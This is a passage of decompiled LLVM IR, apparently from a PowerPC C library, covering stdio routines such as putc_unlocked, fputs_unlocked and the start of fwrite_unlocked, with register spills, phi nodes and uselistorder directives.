dec_label_pc_10009bbc:                            ; preds = %dec_label_pc_10009bb4
  %v1_10009bbc = call i32 @_promoted_size(i32 %v3_10009ba4)
  store i32 %v1_10009bbc, i32* @r29, align 4
  %v0_10009bc4 = load i32, i32* @r31, align 4
  store i32 %v0_10009bc4, i32* %r3.global-to-local, align 4
  %v1_10009bc8 = call i32 @_promoted_size(i32 %v0_10009bc4)
  store i32 %v1_10009bc8, i32* %r3.global-to-local, align 4
  %v0_10009bd4 = call i32 @__asm_mfcr()
  store i32 %v0_10009bd4, i32* %r3.global-to-local, align 4
  store i32 %v0_10009bd4, i32* %r0.global-to-local, align 4
  %v1_10009bd8 = call i32 @__asm_rlwinm(i32 %v0_10009bd4, i32 31, i32 31, i32 31)
  store i32 %v1_10009bd8, i32* %r0.global-to-local, align 4
  %v3_10009bdc = icmp eq i32 %v1_10009bd8, 0
  br i1 %v3_10009bdc, label %dec_label_pc_10009bfc, label %dec_label_pc_10009bbc.dec_label_pc_10009be4_crit_edge

dec_label_pc_10009bbc.dec_label_pc_10009be4_crit_edge: ; preds = %dec_label_pc_10009bbc
  %v0_10009be8.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_10009bf0.pre = load i32, i32* %r25.global-to-local, align 4
  %v1_10009bf4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009be4

dec_label_pc_10009be4:                            ; preds = %dec_label_pc_10009bbc.dec_label_pc_10009be4_crit_edge, %dec_label_pc_10009bb4, %dec_label_pc_10009bac
  %v1_10009bf4 = phi i32 [ %v1_10009bf4.pre, %dec_label_pc_10009bbc.dec_label_pc_10009be4_crit_edge ], [ %v1_10009ba0, %dec_label_pc_10009bb4 ], [ %v1_10009ba0, %dec_label_pc_10009bac ]
  %v0_10009bf0 = phi i32 [ %v0_10009bf0.pre, %dec_label_pc_10009bbc.dec_label_pc_10009be4_crit_edge ], [ %v1_10009b94, %dec_label_pc_10009bb4 ], [ %v1_10009b94, %dec_label_pc_10009bac ]
  %v0_10009be8 = phi i32 [ %v0_10009be8.pre, %dec_label_pc_10009bbc.dec_label_pc_10009be4_crit_edge ], [ %v0_10009b8c, %dec_label_pc_10009bb4 ], [ %v0_10009b8c, %dec_label_pc_10009bac ]
  store i32 %v2_10009824.pre-phi, i32* %r9.global-to-local, align 4
  %v1_10009be8 = mul i32 %v0_10009be8, 4
  store i32 %v1_10009be8, i32* %r0.global-to-local, align 4
  %v2_10009bec = add i32 %v1_10009be8, %v2_10009824.pre-phi
  %v3_10009bec = inttoptr i32 %v2_10009bec to i32*
  %v4_10009bec = load i32, i32* %v3_10009bec, align 4
  store i32 %v4_10009bec, i32* %r0.global-to-local, align 4
  %v1_10009bf0 = mul i32 %v0_10009bf0, 4
  %v2_10009bf4 = add i32 %v1_10009bf0, %v1_10009bf4
  store i32 %v2_10009bf4, i32* %r9.global-to-local, align 4
  %v2_10009bf8 = add i32 %v2_10009bf4, 40
  %v3_10009bf8 = inttoptr i32 %v2_10009bf8 to i32*
  store i32 %v4_10009bec, i32* %v3_10009bf8, align 4
  br label %dec_label_pc_10009bfc

dec_label_pc_10009bfc:                            ; preds = %dec_label_pc_10009bbc, %dec_label_pc_10009b88, %dec_label_pc_10009be4
  %v0_10009bfc = load i32, i32* @r28, align 4
  %v1_10009bfc = add i32 %v0_10009bfc, 28
  %v2_10009bfc = inttoptr i32 %v1_10009bfc to i32*
  %v3_10009bfc = load i32, i32* %v2_10009bfc, align 4
  %v0_10009c00 = load i32, i32* %r27.global-to-local, align 4
  %v1_10009c00 = add i32 %v0_10009c00, 1
  store i32 %v1_10009c00, i32* %r27.global-to-local, align 4
  %v1_10009c04 = add i32 %v3_10009bfc, 2
  store i32 %v1_10009c04, i32* %r9.global-to-local, align 4
  %v2_10009c08 = icmp slt i32 %v1_10009c00, %v1_10009c04
  br i1 %v2_10009c08, label %dec_label_pc_10009b44, label %dec_label_pc_10009c2c

dec_label_pc_10009c14:                            ; preds = %dec_label_pc_10009b38
  %v0_10009c14 = load i32, i32* @r28, align 4
  %v1_10009c14 = add i32 %v0_10009c14, 28
  %v2_10009c14 = inttoptr i32 %v1_10009c14 to i32*
  %v3_10009c14 = load i32, i32* %v2_10009c14, align 4
  store i32 %v3_10009c14, i32* %r5.global-to-local, align 4
  %v1_10009c18 = add i32 %v0_10009c14, 40
  store i32 %v1_10009c18, i32* @r3, align 4
  %v0_10009c1c = load i32, i32* %r7.global-to-local, align 4
  %v1_10009c1c = trunc i32 %v0_10009c1c to i8
  %v3_10009c1c = add i32 %v0_10009c14, 38
  %v4_10009c1c = inttoptr i32 %v3_10009c1c to i8*
  store i8 %v1_10009c1c, i8* %v4_10009c1c, align 1
  %v2_10009c20 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10009c20, i32* @r4, align 4
  %v0_10009c24 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009c24 = mul i32 %v0_10009c24, 4
  store i32 %v1_10009c24, i32* @r5, align 4
  store i32 268475436, i32* @lr, align 4
  %v0_10009c28 = call i32 @memcpy()
  store i32 %v0_10009c28, i32* %r3.global-to-local, align 4
  %v0_10009c2c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009c2c

dec_label_pc_10009c2c:                            ; preds = %dec_label_pc_10009bfc, %dec_label_pc_10009c14
  %v0_10009c2c = phi i32 [ %v0_10009c2c.pre, %dec_label_pc_10009c14 ], [ %v0_10009bfc, %dec_label_pc_10009bfc ]
  %v1_10009c2c = add i32 %v0_10009c2c, 16
  %v2_10009c2c = inttoptr i32 %v1_10009c2c to i32*
  %v3_10009c2c = load i32, i32* %v2_10009c2c, align 4
  store i32 %v3_10009c2c, i32* %r0.global-to-local, align 4
  %v0_10009c30 = load i32, i32* %r26.global-to-local, align 4
  %v2_10009c30 = add i32 %v0_10009c2c, 24
  %v3_10009c30 = inttoptr i32 %v2_10009c30 to i32*
  store i32 %v0_10009c30, i32* %v3_10009c30, align 4
  %v0_10009c34 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009c34 = and i32 %v0_10009c34, 128
  store i32 %v1_10009c34, i32* %r9.global-to-local, align 4
  %v3_10009c34 = icmp eq i32 %v1_10009c34, 0
  br i1 %v3_10009c34, label %dec_label_pc_10009c3c, label %dec_label_pc_10009c48

dec_label_pc_10009c3c:                            ; preds = %dec_label_pc_10009c2c
  %v0_10009c3c = load i32, i32* @r30, align 4
  %v1_10009c3c = add i32 %v0_10009c3c, 1
  store i32 %v1_10009c3c, i32* %r0.global-to-local, align 4
  %v1_10009c40 = load i32, i32* @r28, align 4
  %v2_10009c40 = inttoptr i32 %v1_10009c40 to i32*
  store i32 %v1_10009c3c, i32* %v2_10009c40, align 4
  br label %dec_label_pc_10009c60

dec_label_pc_10009c48:                            ; preds = %dec_label_pc_10009c2c
  %v2_10009c48 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10009c48, i32* %r0.global-to-local, align 4
  %v0_10009c4c = load i32, i32* @r28, align 4
  %v1_10009c4c = inttoptr i32 %v0_10009c4c to i32*
  %v2_10009c4c = load i32, i32* %v1_10009c4c, align 4
  %v1_10009c50 = load i32, i32* @r30, align 4
  %v2_10009c50 = sub i32 %v1_10009c50, %v2_10009c48
  %v1_10009c54 = mul i32 %v2_10009c50, 4
  store i32 %v1_10009c54, i32* %r0.global-to-local, align 4
  %v2_10009c58 = add i32 %v1_10009c54, %v2_10009c4c
  store i32 %v2_10009c58, i32* %r9.global-to-local, align 4
  store i32 %v2_10009c58, i32* %v1_10009c4c, align 4
  br label %dec_label_pc_10009c60

dec_label_pc_10009c60:                            ; preds = %dec_label_pc_10009c3c, %dec_label_pc_10009c48
  %v0_10009c60 = load i32, i32* @r28, align 4
  %v1_10009c60 = add i32 %v0_10009c60, 28
  %v2_10009c60 = inttoptr i32 %v1_10009c60 to i32*
  %v3_10009c60 = load i32, i32* %v2_10009c60, align 4
  store i32 %v3_10009c60, i32* %r9.global-to-local, align 4
  %v1_10009c64 = add i32 %v3_10009c60, 2
  br label %dec_label_pc_10009c70

dec_label_pc_10009c70:                            ; preds = %dec_label_pc_100097d4, %dec_label_pc_100098a8, %dec_label_pc_10009984, %dec_label_pc_10009978, %dec_label_pc_100099a0, %dec_label_pc_100098dc, %dec_label_pc_10009b7c, %dec_label_pc_10009a2c, %dec_label_pc_10009b20, %dec_label_pc_10009c60
  %storemerge2 = phi i32 [ %v1_10009c64, %dec_label_pc_10009c60 ], [ -1, %dec_label_pc_10009b20 ], [ -1, %dec_label_pc_10009a2c ], [ -1, %dec_label_pc_10009b7c ], [ -1, %dec_label_pc_100098dc ], [ -1, %dec_label_pc_100099a0 ], [ -1, %dec_label_pc_10009978 ], [ -1, %dec_label_pc_10009984 ], [ -1, %dec_label_pc_100098a8 ], [ -1, %dec_label_pc_100097d4 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1000976c, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_10009c54, { 1, 0 }
  uselistorder i32 %v0_10009c2c, { 1, 0 }
  uselistorder i32 %v1_10009c00, { 1, 2, 0 }
  uselistorder i32 %v1_10009be8, { 1, 0 }
  uselistorder i32 %v0_10009bd4, { 0, 2, 1 }
  uselistorder i32 %v3_10009ba4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10009ba0, { 1, 2, 0 }
  uselistorder i32 %v1_10009b94, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10009b8c, { 1, 0 }
  uselistorder i32 %v0_10009b8c, { 1, 2, 0 }
  uselistorder i32 %v3_10009b54, { 1, 0, 2 }
  uselistorder i32 %v1_10009b4c, { 1, 0 }
  uselistorder i32 %v0_10009b6c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10009ac4, { 1, 2, 0 }
  uselistorder i32 %v1_10009a9c, { 2, 1, 0 }
  uselistorder i32 %v1_10009a88, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10009a6c, { 1, 0, 2 }
  uselistorder i32 %v1_10009a38, { 1, 3, 2, 0 }
  uselistorder i32 %v1_100099f4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100099b8, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100099a4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10009914, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10009910, { 1, 0 }
  uselistorder i32 %v0_10009928, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000988c, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_10009884, { 1, 0 }
  uselistorder i32 %v1_10009874, { 1, 0 }
  uselistorder i32 %v3_1000986c, { 1, 0, 2 }
  uselistorder i32 %v0_100098e8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_100098b8, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_10009848, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10009830, { 1, 0 }
  uselistorder i32 %v2_10009824.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_10009804, { 1, 0 }
  uselistorder i32 %v1_100097ec, { 1, 2, 0 }
  uselistorder i32 %v0_100097e0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r27.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r26.global-to-local, { 4, 0, 5, 6, 7, 1, 8, 2, 3, 9, 10 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 5, 6, 7, 11, 4, 12, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 36, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1000eb14.190 to i32), { 3, 0, 1, 2, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1000ead4.189 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009c70, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_10009c60, { 1, 0 }
  uselistorder label %dec_label_pc_10009c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10009bfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009b88, { 1, 0 }
  uselistorder label %dec_label_pc_10009b74, { 1, 0 }
  uselistorder label %dec_label_pc_10009b38, { 1, 0 }
  uselistorder label %dec_label_pc_10009a80, { 1, 0 }
  uselistorder label %dec_label_pc_10009a2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100099dc, { 1, 0 }
  uselistorder label %dec_label_pc_100099b0, { 1, 0 }
  uselistorder label %dec_label_pc_10009964, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009960, { 1, 0 }
  uselistorder label %dec_label_pc_100098d4, { 1, 0 }
  uselistorder label %dec_label_pc_100098cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000986c, { 1, 0 }
  uselistorder label %dec_label_pc_10009868, { 1, 0 }
  uselistorder label %dec_label_pc_10009854, { 1, 0 }
  uselistorder label %dec_label_pc_10009834, { 1, 0 }
  uselistorder label %dec_label_pc_10009830, { 1, 0 }
  uselistorder label %dec_label_pc_10009814, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* @r30, align 4
  %v2_10009c9c = add i32 %arg2, 16
  %v3_10009c9c = inttoptr i32 %v2_10009c9c to i32*
  %v4_10009c9c = load i32, i32* %v3_10009c9c, align 4
  store i32 %v4_10009c9c, i32* %r11.global-to-local, align 4
  %v2_10009ca0 = add i32 %arg2, 28
  %v3_10009ca0 = inttoptr i32 %v2_10009ca0 to i32*
  %v4_10009ca0 = load i32, i32* %v3_10009ca0, align 4
  %v2_10009ca4 = icmp ult i32 %v4_10009c9c, %v4_10009ca0
  br i1 %v2_10009ca4, label %dec_label_pc_10009cac, label %dec_label_pc_10009cc0

dec_label_pc_10009cac:                            ; preds = %entry
  %v1_10009cac2 = zext i8 %arg1 to i32
  %v1_10009cb0 = add i32 %v4_10009c9c, 1
  store i32 %v1_10009cb0, i32* %r9.global-to-local, align 4
  store i32 %v1_10009cac2, i32* %r3.global-to-local, align 4
  %v3_10009cb8 = inttoptr i32 %v4_10009c9c to i8*
  store i8 %arg1, i8* %v3_10009cb8, align 1
  %v0_10009d64.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10009d64.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009d64

dec_label_pc_10009cc0:                            ; preds = %entry
  %tmp12 = inttoptr i32 %arg2 to i16*
  %v3_10009cc0 = load i16, i16* %tmp12, align 2
  %v4_10009cc0 = zext i16 %v3_10009cc0 to i32
  %v1_10009cc4 = call i32 @__asm_rlwinm(i32 %v4_10009cc0, i32 0, i32 24, i32 25)
  %v3_10009cc8 = icmp eq i32 %v1_10009cc4, 192
  br i1 %v3_10009cc8, label %dec_label_pc_10009ce4, label %dec_label_pc_10009cd0

dec_label_pc_10009cd0:                            ; preds = %dec_label_pc_10009cc0
  store i32 %arg2, i32* @r3, align 4
  store i32 128, i32* @r4, align 4
  store i32 268475612, i32* @lr, align 4
  %v0_10009cd8 = call i32 @__stdio_trans2w_o()
  store i32 %v0_10009cd8, i32* %r3.global-to-local, align 4
  %v3_10009cdc = icmp eq i32 %v0_10009cd8, 0
  br i1 %v3_10009cdc, label %dec_label_pc_10009ce4, label %dec_label_pc_10009d90

dec_label_pc_10009ce4:                            ; preds = %dec_label_pc_10009cd0, %dec_label_pc_10009cc0
  %v0_10009ce4 = load i32, i32* @r31, align 4
  %v1_10009ce4 = add i32 %v0_10009ce4, 4
  %v2_10009ce4 = inttoptr i32 %v1_10009ce4 to i32*
  %v3_10009ce4 = load i32, i32* %v2_10009ce4, align 4
  %v0_10009ce8 = load i32, i32* @r30, align 4
  %v1_10009ce8 = urem i32 %v0_10009ce8, 256
  store i32 %v1_10009ce8, i32* %r3.global-to-local, align 4
  %v3_10009cec = icmp eq i32 %v3_10009ce4, -2
  br i1 %v3_10009cec, label %dec_label_pc_10009d94, label %dec_label_pc_10009cf4

dec_label_pc_10009cf4:                            ; preds = %dec_label_pc_10009ce4
  %v1_10009cf4 = add i32 %v0_10009ce4, 12
  %v2_10009cf4 = inttoptr i32 %v1_10009cf4 to i32*
  %v3_10009cf4 = load i32, i32* %v2_10009cf4, align 4
  store i32 %v3_10009cf4, i32* %r9.global-to-local, align 4
  %v1_10009cf8 = add i32 %v0_10009ce4, 8
  %v2_10009cf8 = inttoptr i32 %v1_10009cf8 to i32*
  %v3_10009cf8 = load i32, i32* %v2_10009cf8, align 4
  %v4_10009cfc = icmp eq i32 %v3_10009cf4, %v3_10009cf8
  br i1 %v4_10009cfc, label %dec_label_pc_10009d6c, label %dec_label_pc_10009d04

dec_label_pc_10009d04:                            ; preds = %dec_label_pc_10009cf4
  %v1_10009d04 = add i32 %v0_10009ce4, 16
  %v2_10009d04 = inttoptr i32 %v1_10009d04 to i32*
  %v3_10009d04 = load i32, i32* %v2_10009d04, align 4
  %v4_10009d08 = icmp eq i32 %v3_10009cf4, %v3_10009d04
  br i1 %v4_10009d08, label %dec_label_pc_10009d10, label %dec_label_pc_10009d20

dec_label_pc_10009d10:                            ; preds = %dec_label_pc_10009d04
  store i32 %v0_10009ce4, i32* %r3.global-to-local, align 4
  store i32 268475672, i32* @lr, align 4
  %v2_10009d14 = call i32 @__stdio_wcommit(i32 %v0_10009ce4)
  store i32 %v2_10009d14, i32* %r3.global-to-local, align 4
  %v3_10009d18 = icmp eq i32 %v2_10009d14, 0
  br i1 %v3_10009d18, label %dec_label_pc_10009d10.dec_label_pc_10009d20_crit_edge, label %dec_label_pc_10009d90

dec_label_pc_10009d10.dec_label_pc_10009d20_crit_edge: ; preds = %dec_label_pc_10009d10
  %v0_10009d20.pre = load i32, i32* @r31, align 4
  %v0_10009d24.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009d20

dec_label_pc_10009d20:                            ; preds = %dec_label_pc_10009d10.dec_label_pc_10009d20_crit_edge, %dec_label_pc_10009d04
  %v0_10009d24 = phi i32 [ %v0_10009d24.pre, %dec_label_pc_10009d10.dec_label_pc_10009d20_crit_edge ], [ %v0_10009ce8, %dec_label_pc_10009d04 ]
  %v0_10009d20 = phi i32 [ %v0_10009d20.pre, %dec_label_pc_10009d10.dec_label_pc_10009d20_crit_edge ], [ %v0_10009ce4, %dec_label_pc_10009d04 ]
  %v1_10009d20 = add i32 %v0_10009d20, 16
  %v2_10009d20 = inttoptr i32 %v1_10009d20 to i32*
  %v3_10009d20 = load i32, i32* %v2_10009d20, align 4
  store i32 %v3_10009d20, i32* %r9.global-to-local, align 4
  %v1_10009d24 = urem i32 %v0_10009d24, 256
  store i32 %v1_10009d24, i32* %r11.global-to-local, align 4
  %v1_10009d28 = trunc i32 %v0_10009d24 to i8
  %v3_10009d28 = inttoptr i32 %v3_10009d20 to i8*
  store i8 %v1_10009d28, i8* %v3_10009d28, align 1
  %v0_10009d2c = load i32, i32* %r9.global-to-local, align 4
  %v1_10009d2c = add i32 %v0_10009d2c, 1
  store i32 %v1_10009d2c, i32* %r9.global-to-local, align 4
  %v1_10009d30 = load i32, i32* @r31, align 4
  %v2_10009d30 = add i32 %v1_10009d30, 16
  %v3_10009d30 = inttoptr i32 %v2_10009d30 to i32*
  store i32 %v1_10009d2c, i32* %v3_10009d30, align 4
  %v0_10009d34 = load i32, i32* @r31, align 4
  %v1_10009d34 = inttoptr i32 %v0_10009d34 to i16*
  %v2_10009d34 = load i16, i16* %v1_10009d34, align 2
  %v3_10009d34 = zext i16 %v2_10009d34 to i32
  %v1_10009d38 = and i32 %v3_10009d34, 256
  store i32 %v1_10009d38, i32* %r9.global-to-local, align 4
  %v3_10009d38 = icmp eq i32 %v1_10009d38, 0
  br i1 %v3_10009d38, label %dec_label_pc_10009d88, label %dec_label_pc_10009d40

dec_label_pc_10009d40:                            ; preds = %dec_label_pc_10009d20
  %v0_10009d40 = load i32, i32* %r11.global-to-local, align 4
  %v3_10009d40 = icmp eq i32 %v0_10009d40, 10
  br i1 %v3_10009d40, label %dec_label_pc_10009d48, label %dec_label_pc_10009d88

dec_label_pc_10009d48:                            ; preds = %dec_label_pc_10009d40
  store i32 %v0_10009d34, i32* %r3.global-to-local, align 4
  store i32 268475728, i32* @lr, align 4
  %v2_10009d4c = call i32 @__stdio_wcommit(i32 %v0_10009d34)
  store i32 %v2_10009d4c, i32* %r3.global-to-local, align 4
  %v3_10009d50 = icmp eq i32 %v2_10009d4c, 0
  br i1 %v3_10009d50, label %dec_label_pc_10009d88, label %dec_label_pc_10009d58

dec_label_pc_10009d58:                            ; preds = %dec_label_pc_10009d48
  %v0_10009d58 = load i32, i32* @r31, align 4
  %v1_10009d58 = add i32 %v0_10009d58, 16
  %v2_10009d58 = inttoptr i32 %v1_10009d58 to i32*
  %v3_10009d58 = load i32, i32* %v2_10009d58, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10009d60 = add i32 %v3_10009d58, -1
  store i32 %v1_10009d60, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009d64

dec_label_pc_10009d64:                            ; preds = %dec_label_pc_10009cac, %dec_label_pc_10009d58
  %v1_10009d64 = phi i32 [ %v1_10009d64.pre, %dec_label_pc_10009cac ], [ %v0_10009d58, %dec_label_pc_10009d58 ]
  %v0_10009d64 = phi i32 [ %v0_10009d64.pre, %dec_label_pc_10009cac ], [ %v1_10009d60, %dec_label_pc_10009d58 ]
  %v2_10009d64 = add i32 %v1_10009d64, 16
  %v3_10009d64 = inttoptr i32 %v2_10009d64 to i32*
  store i32 %v0_10009d64, i32* %v3_10009d64, align 4
  %v0_10009da4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009d94

dec_label_pc_10009d6c:                            ; preds = %dec_label_pc_10009cf4
  %v1_10009d6c = inttoptr i32 %v0_10009ce4 to i16*
  store i32 %v0_10009ce4, i32* %r3.global-to-local, align 4
  %v2_10009d70 = ptrtoint i8* %stack_var_-24 to i32
  store i32 1, i32* @r5, align 4
  %v6_10009d78 = trunc i32 %v0_10009ce8 to i8
  store i8 %v6_10009d78, i8* %stack_var_-24, align 1
  store i32 268475776, i32* @lr, align 4
  %v5_10009d7c = call i32 @__stdio_WRITE(i16* %v1_10009d6c, i32 %v2_10009d70)
  store i32 %v5_10009d7c, i32* %r3.global-to-local, align 4
  %v3_10009d80 = icmp eq i32 %v5_10009d7c, 0
  br i1 %v3_10009d80, label %dec_label_pc_10009d90, label %dec_label_pc_10009d88

dec_label_pc_10009d88:                            ; preds = %dec_label_pc_10009d40, %dec_label_pc_10009d6c, %dec_label_pc_10009d48, %dec_label_pc_10009d20
  %v0_10009d88 = load i32, i32* @r30, align 4
  %v1_10009d88 = urem i32 %v0_10009d88, 256
  store i32 %v1_10009d88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009d94

dec_label_pc_10009d90:                            ; preds = %dec_label_pc_10009d10, %dec_label_pc_10009cd0, %dec_label_pc_10009d6c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009d94

dec_label_pc_10009d94:                            ; preds = %dec_label_pc_10009ce4, %dec_label_pc_10009d88, %dec_label_pc_10009d64, %dec_label_pc_10009d90
  %v0_10009da4 = phi i32 [ %v1_10009ce8, %dec_label_pc_10009ce4 ], [ %v1_10009d88, %dec_label_pc_10009d88 ], [ %v0_10009da4.pre, %dec_label_pc_10009d64 ], [ -1, %dec_label_pc_10009d90 ]
  ret i32 %v0_10009da4

; uselistorder directives
  uselistorder i32 %v1_10009d88, { 1, 0 }
  uselistorder i32 %v0_10009d34, { 1, 0, 2 }
  uselistorder i32 %v0_10009d24, { 1, 0 }
  uselistorder i32 %v1_10009ce8, { 1, 0 }
  uselistorder i32 %v0_10009ce8, { 1, 2, 0 }
  uselistorder i32 %v0_10009ce4, { 3, 4, 0, 2, 1, 5, 7, 6, 8 }
  uselistorder i32 %v4_10009c9c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 13, 0 }
  uselistorder i32 %arg2, { 0, 4, 1, 2, 3 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009d94, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10009d90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009d88, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10009d64, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10009dc0 = call i32 @__GI_strlen()
  store i32 %v0_10009dc0, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10009ddc.195 to i32), i32* @lr, align 4
  %v4_10009dd8 = inttoptr i32 %arg2 to i16*
  %v5_10009dd8 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_10009dc0, i16* %v4_10009dd8)
  %v1_10009de0 = load i32, i32* @r27, align 4
  %v4_10009de0 = icmp eq i32 %v5_10009dd8, %v1_10009de0
  br i1 %v4_10009de0, label %dec_label_pc_10009de8, label %dec_label_pc_10009dec

dec_label_pc_10009de8:                            ; preds = %entry
  br label %dec_label_pc_10009dec

dec_label_pc_10009dec:                            ; preds = %entry, %dec_label_pc_10009de8
  %v0_10009dec = phi i32 [ -1, %entry ], [ %v5_10009dd8, %dec_label_pc_10009de8 ]
  ret i32 %v0_10009dec

; uselistorder directives
  uselistorder label %dec_label_pc_10009dec, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_10009e1c = load i16, i16* %arg4, align 2
  %v4_10009e1c = zext i16 %v3_10009e1c to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_10009e2c = call i32 @__asm_rlwinm(i32 %v4_10009e1c, i32 0, i32 24, i32 25)
  store i32 %tmp, i32* @r3, align 4
  %v3_10009e34 = icmp eq i32 %v1_10009e2c, 192
  br i1 %v3_10009e34, label %dec_label_pc_10009e48, label %dec_label_pc_10009e3c

dec_label_pc_10009e3c:                            ; preds = %entry
  store i32 268475968, i32* @lr, align 4
  %v0_10009e3c = call i32 @__stdio_trans2w_o()
  %v3_10009e40 = icmp eq i32 %v0_10009e3c, 0
  br i1 %v3_10009e40, label %dec_label_pc_10009e48, label %dec_label_pc_10009ea0

dec_label_pc_10009e48:                            ; preds = %dec_label_pc_10009e3c, %entry
  %v0_10009e48 = load i32, i32* @r29, align 4
  %v3_10009e48 = icmp eq i32 %v0_10009e48, 0
  %v0_10009e4c = load i32, i32* @r30, align 4
  %v3_10009e4c = icmp eq i32 %v0_10009e4c, 0
  %brmerge = or i1 %v3_10009e48, %v3_10009e4c
  br i1 %brmerge, label %dec_label_pc_10009ea0, label %dec_label_pc_10009e58

dec_label_pc_10009e58:                            ; preds = %dec_label_pc_10009e48
  %v2_10009e60 = udiv i32 -1, %v0_10009e48
  %v0_10009e64 = load i32, i32* @r31, align 4
  %v3_10009e68 = icmp ugt i32 %v0_10009e4c, %v2_10009e60
  %v1_10009e80 = inttoptr i32 %v0_10009e64 to i16*
  br i1 %v3_10009e68, label %dec_label_pc_10009e80, label %dec_label_pc_10009e70

dec_label_pc_10009e70:                            ; preds = %dec_label_pc_10009e58
  %v0_10009e5c = load i32, i32* @r28, align 4
  %v2_10009e70 = mul i32 %v0_10009e4c, %v0_10009e48
  store i32 %v2_10009e70, i32* %r4.global-to-local, align 4
  store i32 268476024, i32* @lr, align 4
